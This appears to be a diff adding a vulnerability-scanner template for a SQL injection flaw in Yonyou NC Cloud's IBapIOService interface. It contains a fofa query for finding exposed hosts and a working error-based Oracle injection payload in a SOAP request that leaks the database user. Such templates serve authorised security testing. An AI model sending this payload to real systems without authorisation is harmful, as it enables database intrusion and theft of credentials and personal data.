@@ -1,0 +1,41 @@
+id: yongyouNC-Cloud-IBapIOService-sql
+
+info:
+  name: 用友NC Cloud IBapIOService SQL注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="用友-NC-Cloud"
+    用友NC Cloud中IBapIOService 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://mp.weixin.qq.com/s/K0pBOqLorsHzJ68r6KZ6BA
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
+            <soapenv:Header/>
+            <soapenv:Body>
+                <gs:getBapTableDatas>
+                    <gs:stringarrayItem>
+                        DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')-- abc
+                    </gs:stringarrayItem>
+                </gs:getBapTableDatas>
+            </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '未知的主机'
+      - type: status
+        status: 
+          - 500
